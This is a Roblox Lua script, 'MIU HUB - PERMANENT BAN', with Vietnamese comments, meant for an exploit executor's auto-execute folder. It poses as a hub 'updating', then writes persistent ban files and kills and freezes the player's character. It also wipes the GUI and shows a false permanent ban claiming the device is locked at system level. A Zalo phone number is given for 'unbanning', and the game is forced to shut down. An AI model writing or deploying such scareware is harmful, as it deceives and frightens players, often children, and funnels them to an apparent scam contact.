-- MIU HUB - PERMANENT BAN (Dành cho Auto Execute)
-- Script này tự động kiểm tra và ban ngay khi vào game

pcall(function() script.Parent = nil end)

local player = game:GetService("Players").LocalPlayer
local userId = player.UserId
local zaloNumber = "0974516980"

---=== KIỂM TRA FILE BAN (TỰ ĐỘNG) ===---

local function isDeviceBanned()
    -- Kiểm tra file chính
    local s1, d1 = pcall(function()
        return readfile("MIU_HUB_BAN_" .. userId .. ".json")
    end)
    if s1 and d1 and #d1 > 0 then
        local decoded = game:GetService("HttpService"):JSONDecode(d1)
        if decoded and decoded.banned == true then
            return true, decoded
        end
    end
    
    -- Kiểm tra file backup
    local s2, d2 = pcall(function()
        return readfile("MIU_HUB_BAN_BACKUP_" .. userId .. ".txt")
    end)
    if s2 and d2 and #d2 > 0 then
        local decoded = game:GetService("HttpService"):JSONDecode(d2)
        if decoded and decoded.banned == true then
            return true, decoded
        end
    end
    
    return false, nil
end

local function writeDeviceBan()
    local data = {
        banned = true,
        userId = userId,
        username = player.Name,
        displayName = player.DisplayName,
        banTime = os.time(),
        banDate = os.date("%Y-%m-%d %H:%M:%S"),
        banId = "MH-PERM-" .. os.date("%Y%m%d") .. "-" .. math.random(10000, 99999),
        unbanContact = zaloNumber
    }
    local json = game:GetService("HttpService"):JSONEncode(data)
    pcall(function() writefile("MIU_HUB_BAN_" .. userId .. ".json", json) end)
    pcall(function() writefile("MIU_HUB_BAN_BACKUP_" .. userId .. ".txt", json) end)
    pcall(function() setclipboard(json) end)
end

---=== KHÓA TOÀN BỘ GAME ===---

local function lockGame()
    -- Khóa nhân vật
    pcall(function()
        local char = player.Character
        if char then
            local hum = char:FindFirstChild("Humanoid")
            if hum then
                hum.Health = 0
                hum.WalkSpeed = 0
                hum.JumpPower = 0
                hum.AutoRotate = false
                hum.PlatformStand = true
            end
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                root.Anchored = true
                root.Velocity = Vector3.new(0,0,0)
            end
            local head = char:FindFirstChild("Head")
            if head then head.Anchored = true end
        end
    end)
    
    -- Khóa khi nhân vật mới xuất hiện
    player.CharacterAdded:Connect(function(char)
        task.wait(0.1)
        local hum = char:FindFirstChild("Humanoid")
        if hum then
            hum.Health = 0
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            hum.PlatformStand = true
        end
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then root.Anchored = true end
    end)
    
    -- Chặn bàn phím
    pcall(function()
        local uis = game:GetService("UserInputService")
        uis.BlockUserInput = Enum.UserInputType.Keyboard
    end)
end

---=== HIỂN THỊ BAN SCREEN ===---

local function showBanScreen()
    -- Xóa toàn bộ GUI cũ
    pcall(function()
        for _, v in pairs(player.PlayerGui:GetChildren()) do
            v:Destroy()
        end
    end)
    
    local banGui = Instance.new("ScreenGui")
    banGui.Name = "MiuPermanentBan"
    banGui.ResetOnSpawn = false
    banGui.Parent = player:WaitForChild("PlayerGui")
    banGui.DisplayOrder = 99999
    banGui.IgnoreGuiInset = true
    
    -- Background
    local blackBg = Instance.new("Frame")
    blackBg.Size = UDim2.new(1, 0, 1, 0)
    blackBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackBg.BackgroundTransparency = 0.6
    blackBg.BorderSizePixel = 0
    blackBg.ZIndex = 99999
    blackBg.Parent = banGui
    
    local redOverlay = Instance.new("Frame")
    redOverlay.Size = UDim2.new(1, 0, 1, 0)
    redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    redOverlay.BackgroundTransparency = 0.93
    redOverlay.BorderSizePixel = 0
    redOverlay.ZIndex = 99999
    redOverlay.Parent = banGui
    
    coroutine.wrap(function()
        while redOverlay and redOverlay.Parent do
            redOverlay.BackgroundTransparency = 0.88 + math.random() * 0.1
            task.wait(0.2)
        end
    end)()
    
    -- Frame chính
    local banFrame = Instance.new("Frame")
    banFrame.Size = UDim2.new(0, 420, 0, 420)
    banFrame.Position = UDim2.new(0.5, -210, 0.5, -210)
    banFrame.BackgroundColor3 = Color3.fromRGB(15, 5, 5)
    banFrame.BackgroundTransparency = 0.1
    banFrame.BorderSizePixel = 0
    banFrame.ZIndex = 100000
    banFrame.Parent = banGui
    
    local banCorner = Instance.new("UICorner")
    banCorner.CornerRadius = UDim.new(0, 15)
    banCorner.Parent = banFrame
    
    local banStroke = Instance.new("UIStroke")
    banStroke.Color = Color3.fromRGB(255, 0, 0)
    banStroke.Thickness = 4
    banStroke.Transparency = 0.1
    banStroke.ZIndex = 100000
    banStroke.Parent = banFrame
    
    -- Icon
    local banIcon = Instance.new("TextLabel")
    banIcon.Size = UDim2.new(1, 0, 0, 50)
    banIcon.Position = UDim2.new(0, 0, 0, 10)
    banIcon.BackgroundTransparency = 1
    banIcon.Text = "💀"
    banIcon.TextColor3 = Color3.fromRGB(255, 0, 0)
    banIcon.TextSize = 45
    banIcon.Font = Enum.Font.GothamBold
    banIcon.ZIndex = 100000
    banIcon.Parent = banFrame
    
    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 35)
    title.Position = UDim2.new(0, 0, 0, 60)
    title.BackgroundTransparency = 1
    title.Text = "BẠN ĐÃ BỊ CẤM VĨNH VIỄN"
    title.TextColor3 = Color3.fromRGB(255, 30, 30)
    title.TextSize = 22
    title.Font = Enum.Font.GothamBlack
    title.ZIndex = 100000
    title.Parent = banFrame
    
    -- PERMANENT
    local permLabel = Instance.new("TextLabel")
    permLabel.Size = UDim2.new(1, 0, 0, 25)
    permLabel.Position = UDim2.new(0, 0, 0, 95)
    permLabel.BackgroundTransparency = 1
    permLabel.Text = "⛔ PERMANENT BAN ⛔"
    permLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    permLabel.TextSize = 14
    permLabel.Font = Enum.Font.GothamBold
    permLabel.ZIndex = 100000
    permLabel.Parent = banFrame
    
    -- Mã
    local banId = "MH-PERM-" .. os.date("%Y%m%d") .. "-" .. math.random(10000, 99999)
    local idLabel = Instance.new("TextLabel")
    idLabel.Size = UDim2.new(1, -40, 0, 22)
    idLabel.Position = UDim2.new(0, 20, 0, 123)
    idLabel.BackgroundTransparency = 1
    idLabel.Text = "Mã lệnh cấm: " .. banId
    idLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    idLabel.TextSize = 13
    idLabel.Font = Enum.Font.Gotham
    idLabel.ZIndex = 100000
    idLabel.Parent = banFrame
    
    -- Lý do
    local reasonLabel = Instance.new("TextLabel")
    reasonLabel.Size = UDim2.new(1, -40, 0, 40)
    reasonLabel.Position = UDim2.new(0, 20, 0, 148)
    reasonLabel.BackgroundTransparency = 1
    reasonLabel.Text = "Lý do: Phát hiện hành vi gian lận (Miu Hub)\nThiết bị và tài khoản đã bị khóa vĩnh viễn"
    reasonLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
    reasonLabel.TextSize = 12
    reasonLabel.Font = Enum.Font.Gotham
    reasonLabel.TextWrapped = true
    reasonLabel.TextXAlignment = Enum.TextXAlignment.Center
    reasonLabel.ZIndex = 100000
    reasonLabel.Parent = banFrame
    
    -- Cảnh báo
    local warnLabel = Instance.new("TextLabel")
    warnLabel.Size = UDim2.new(1, -40, 0, 35)
    warnLabel.Position = UDim2.new(0, 20, 0, 190)
    warnLabel.BackgroundTransparency = 1
    warnLabel.Text = "⚠️ Mọi nỗ lực vào lại game đều vô ích\nThiết bị của bạn đã bị khóa ở cấp độ hệ thống"
    warnLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
    warnLabel.TextSize = 12
    warnLabel.Font = Enum.Font.Gotham
    warnLabel.TextWrapped = true
    warnLabel.TextXAlignment = Enum.TextXAlignment.Center
    warnLabel.ZIndex = 100000
    warnLabel.Parent = banFrame
    
    ---=== KHUNG ZALO ===---
    
    local zaloFrame = Instance.new("Frame")
    zaloFrame.Size = UDim2.new(1, -60, 0, 70)
    zaloFrame.Position = UDim2.new(0, 30, 0, 235)
    zaloFrame.BackgroundColor3 = Color3.fromRGB(0, 100, 50)
    zaloFrame.BackgroundTransparency = 0.3
    zaloFrame.BorderSizePixel = 0
    zaloFrame.ZIndex = 100000
    zaloFrame.Parent = banFrame
    
    local zaloCorner = Instance.new("UICorner")
    zaloCorner.CornerRadius = UDim.new(0, 8)
    zaloCorner.Parent = zaloFrame
    
    local zaloIcon = Instance.new("TextLabel")
    zaloIcon.Size = UDim2.new(0, 30, 1, 0)
    zaloIcon.Position = UDim2.new(0, 5, 0, 0)
    zaloIcon.BackgroundTransparency = 1
    zaloIcon.Text = "💬"
    zaloIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
    zaloIcon.TextSize = 20
    zaloIcon.Font = Enum.Font.Gotham
    zaloIcon.ZIndex = 100001
    zaloIcon.Parent = zaloFrame
    
    local zaloText = Instance.new("TextLabel")
    zaloText.Size = UDim2.new(1, -40, 0, 22)
    zaloText.Position = UDim2.new(0, 38, 0, 5)
    zaloText.BackgroundTransparency = 1
    zaloText.Text = "LIÊN HỆ MỞ BAN"
    zaloText.TextColor3 = Color3.fromRGB(255, 255, 255)
    zaloText.TextSize = 14
    zaloText.Font = Enum.Font.GothamBold
    zaloText.TextXAlignment = Enum.TextXAlignment.Left
    zaloText.ZIndex = 100001
    zaloText.Parent = zaloFrame
    
    local zaloNumberLabel = Instance.new("TextLabel")
    zaloNumberLabel.Size = UDim2.new(1, -40, 0, 25)
    zaloNumberLabel.Position = UDim2.new(0, 38, 0, 28)
    zaloNumberLabel.BackgroundTransparency = 1
    zaloNumberLabel.Text = "Zalo: " .. zaloNumber
    zaloNumberLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
    zaloNumberLabel.TextSize = 18
    zaloNumberLabel.Font = Enum.Font.GothamBlack
    zaloNumberLabel.TextXAlignment = Enum.TextXAlignment.Left
    zaloNumberLabel.ZIndex = 100001
    zaloNumberLabel.Parent = zaloFrame
    
    -- Nhấp nháy số Zalo
    coroutine.wrap(function()
        while zaloNumberLabel and zaloNumberLabel.Parent do
            zaloNumberLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
            task.wait(0.5)
            zaloNumberLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
            task.wait(0.5)
        end
    end)()
    
    local dongLabel = Instance.new("TextLabel")
    dongLabel.Size = UDim2.new(1, -40, 0, 18)
    dongLabel.Position = UDim2.new(0, 38, 0, 50)
    dongLabel.BackgroundTransparency = 1
    dongLabel.Text = "Nhắn tin để được hỗ trợ mở ban"
    dongLabel.TextColor3 = Color3.fromRGB(200, 255, 200)
    dongLabel.TextSize = 11
    dongLabel.Font = Enum.Font.GothamLight
    dongLabel.TextXAlignment = Enum.TextXAlignment.Left
    dongLabel.ZIndex = 100001
    dongLabel.Parent = zaloFrame
    
    -- Nút copy
    local copyButton = Instance.new("TextButton")
    copyButton.Size = UDim2.new(0, 180, 0, 32)
    copyButton.Position = UDim2.new(0.5, -90, 0, 318)
    copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 80)
    copyButton.Text = "📋 SAO CHÉP SỐ ZALO"
    copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyButton.TextSize = 12
    copyButton.Font = Enum.Font.GothamBold
    copyButton.ZIndex = 100000
    copyButton.Parent = banFrame
    
    local copyCorner = Instance.new("UICorner")
    copyCorner.CornerRadius = UDim.new(0, 6)
    copyCorner.Parent = copyButton
    
    copyButton.MouseButton1Click:Connect(function()
        pcall(function() setclipboard(zaloNumber) end)
        copyButton.Text = "✅ ĐÃ SAO CHÉP!"
        task.delay(2, function()
            if copyButton then copyButton.Text = "📋 SAO CHÉP SỐ ZALO" end
        end)
    end)
    
    -- Nút thoát
    local okButton = Instance.new("TextButton")
    okButton.Size = UDim2.new(0, 180, 0, 42)
    okButton.Position = UDim2.new(0.5, -90, 0, 360)
    okButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
    okButton.Text = "THOÁT GAME"
    okButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    okButton.TextSize = 16
    okButton.Font = Enum.Font.GothamBold
    okButton.ZIndex = 100000
    okButton.Parent = banFrame
    
    local okCorner = Instance.new("UICorner")
    okCorner.CornerRadius = UDim.new(0, 10)
    okCorner.Parent = okButton
    
    okButton.MouseButton1Click:Connect(function()
        game:Shutdown()
    end)
    
    -- Tự động kick
    task.delay(30, function()
        if banGui then banGui:Destroy() end
        game:Shutdown()
    end)
    
    -- Rung
    coroutine.wrap(function()
        local origPos = banFrame.Position
        for i = 1, 25 do
            banFrame.Position = UDim2.new(0.5, -210 + math.random(-4, 4), 0.5, -210 + math.random(-3, 3))
            task.wait(0.03)
        end
        banFrame.Position = origPos
    end)()
end

---=== MAIN EXECUTION ===---

-- Kiểm tra ban
local banned, banInfo = isDeviceBanned()

if banned then
    -- Đã bị ban → khóa game và hiện ban ngay
    lockGame()
    showBanScreen()
else
    -- Lần đầu: hiện "đang cập nhật" → ghi file ban → hiện ban
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "MiuHubGUI"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 350, 0, 200)
    frame.Position = UDim2.new(0.5, -175, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Parent = gui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(233, 69, 96)
    stroke.Thickness = 2
    stroke.Transparency = 0.3
    stroke.Parent = frame
    
    local wIcon = Instance.new("TextLabel")
    wIcon.Size = UDim2.new(1, 0, 0, 40)
    wIcon.Position = UDim2.new(0, 0, 0, 12)
    wIcon.BackgroundTransparency = 1
    wIcon.Text = "⚠️"
    wIcon.TextColor3 = Color3.fromRGB(233, 69, 96)
    wIcon.TextSize = 30
    wIcon.Font = Enum.Font.GothamBold
    wIcon.Parent = frame
    
    local tLabel = Instance.new("TextLabel")
    tLabel.Size = UDim2.new(1, 0, 0, 30)
    tLabel.Position = UDim2.new(0, 0, 0, 52)
    tLabel.BackgroundTransparency = 1
    tLabel.Text = "MIU HUB"
    tLabel.TextColor3 = Color3.fromRGB(233, 69, 96)
    tLabel.TextSize = 22
    tLabel.Font = Enum.Font.GothamBold
    tLabel.Parent = frame
    
    local uLabel = Instance.new("TextLabel")
    uLabel.Size = UDim2.new(1, 0, 0, 25)
    uLabel.Position = UDim2.new(0, 0, 0, 82)
    uLabel.BackgroundTransparency = 1
    uLabel.Text = "Đang cập nhật hệ thống..."
    uLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
    uLabel.TextSize = 16
    uLabel.Font = Enum.Font.Gotham
    uLabel.Parent = frame
    
    local spinner = Instance.new("Frame")
    spinner.Size = UDim2.new(0, 30, 0, 30)
    spinner.Position = UDim2.new(0.5, -15, 0, 115)
    spinner.BackgroundTransparency = 1
    spinner.BorderSizePixel = 0
    spinner.Parent = frame
    
    local spCorner = Instance.new("UICorner")
    spCorner.CornerRadius = UDim.new(1, 0)
    spCorner.Parent = spinner
    
    local spStroke = Instance.new("UIStroke")
    spStroke.Color = Color3.fromRGB(233, 69, 96)
    spStroke.Thickness = 3
    spStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    spStroke.Parent = spinner
    
    spinner.Rotation = 0
    coroutine.wrap(function()
        while spinner and spinner.Parent do
            spinner.Rotation = spinner.Rotation + 5
            task.wait(0.03)
        end
    end)()
    
    local cLabel = Instance.new("TextLabel")
    cLabel.Size = UDim2.new(1, 0, 0, 20)
    cLabel.Position = UDim2.new(0, 0, 0, 155)
    cLabel.BackgroundTransparency = 1
    cLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    cLabel.TextSize = 13
    cLabel.Font = Enum.Font.GothamLight
    cLabel.Parent = frame
    
    for i = 3, 1, -1 do
        cLabel.Text = "Tự động kiểm tra sau " .. i .. " giây"
        task.wait(1)
    end
    
    if gui then gui:Destroy() end
    
    -- Ghi file ban
    writeDeviceBan()
    
    -- Hiện ban
    lockGame()
    showBanScreen()
end
